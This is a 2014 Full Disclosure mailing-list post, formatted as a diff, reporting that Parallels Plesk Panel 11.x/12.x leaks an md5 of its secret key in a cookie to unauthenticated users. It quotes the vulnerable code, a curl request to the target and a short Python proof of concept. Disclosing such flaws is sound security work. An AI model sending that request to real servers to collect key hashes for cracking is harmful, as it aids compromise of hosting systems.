@@ -1,0 +1,116 @@
+
+Date: Tue, 22 Apr 2014 12:39:07 +0200
+From: Tim Rots <timrots.nl.throwaway@...il.com>
+To: fulldisclosure@...lists.org
+Subject: [FD] Parallels Plesk Panel 12.x & 11.x /etc/psa/private/secret_key
+	leakage
+
+While auditing the source code for Parallels Plesk Panel 12.x on Linux I
+noticed the following feature that leads to leakage of the
+'/etc/psa/private/secret_key'-file in md5 format to non-authenticated users.
+
+Parallels responded that the 16byte 'secret_key' should provide sufficient
+entropy for this not being an issue.
+Soooo... even if I can control part of the salt to calculate the md5sum..?
+See for yourself.
+
+
+Code where the bug resides in:
+----
+/opt/psa/admin/htdocs/enterprise/rsession_init.php
+
+ 31 if ($failureRedirectUrl = get_gpc('failure_redirect_url')) {
+ 36     hspc_setopt('failure_redirect_url', $failureRedirectUrl);
+>37     hspc_setopt('failure_redirect_url_sign', md5($failureRedirectUrl .
+Plesk_Base_Utils_String::getCryptKey()));
+ 38 }
+...
+..
+/opt/psa/admin/plib/Plesk/Base/Utils/String.php
+
+363     final public static function getCryptKey() {
+...
+369             if (Os::UNIX) {
+370                 self::$_cryptKey = @file_get_contents(ENCRYPT_KEY_FILE);
+..
+380         return self::$_cryptKey;
+381     }
+...
+..
+/opt/psa/admin/plib/compile_time_defaults.php
+
+12 define('ENCRYPT_KEY_FILE', "/etc/psa/private/secret_key");
+----
+
+
+Summary of bug:
+
+- user sends 1 HTTP requst to rsession_init.php on the remote server which
+contains an invalid PHPSESSIONID and a redirect URL for when the login
+fails.
+- script sets two cookies which contains the following values:
+failure_redirect_url = $failureRedirectUrl (supplied in URL)
+failure_redirect_url_sign = md5($failureRedirectUrl + contents
+/etc/psa/private/secret_key)
+
+[+] Annoying redirect loop if localhost is specified as url to to redirect
+to when login fails until cookies are cleared.
+
+
+PoC:
+root@...ian7:~# #see /usr/local/psa/admin/sbin/encrypt_keygen for details
+on key generation routine
+root@...ian7:~# dd if=/dev/urandom of=/etc/psa/private/secret_key bs=16
+count=1
+1+0 records in
+1+0 records out
+16 bytes (16 B) copied, 0.000183366 s, 87.3 kB/s
+
+root@...ian7:~# hexdump -C /etc/psa/private/secret_key
+00000000  99 51 17 9a c6 8c 6e bd  4a 75 98 73 e2 64 fa e4
+ |.Q....n.Ju.s.d..|
+
+
+$ curl -k -i -s "
+https://debian7:8443/enterprise/rsession_init.php?PHPSESSID=000000000000000000000000000000000&failure_redirect_url=w00t"|awk
+'/fail/ {print $2}'
+.
+..
+...
+failure_redirect_url=w00t;
+failure_redirect_url_sign=03ba5675030c59bf66bbc2f4d30aec61;
+
+
+root@...ian7:~# ./poc.py
+03ba5675030c59bf66bbc2f4d30aec61
+
+---poc.py---
+#! /usr/bin/env python
+
+import hashlib
+import binascii
+
+with open('/etc/psa/private/secret_key') as f:
+whoops = hashlib.md5("w00t" +
+binascii.unhexlify(f.read().encode('hex'))).hexdigest()
+print whoops
+------
+
+
+In theory this bug will give you enough ammunition to calculate the
+contents of the /etc/psa/private/secret_key as we have part of the salt,
+and already know the outcome of a insecure hashing algorithm to match
+against.
+I'm glad nobody owns the amount of computing power which is required to
+abuse this bug nowadays anyhow .. :']
+
+Regards,
+
+Tim Rots
+
+The Netherlands
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+http://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
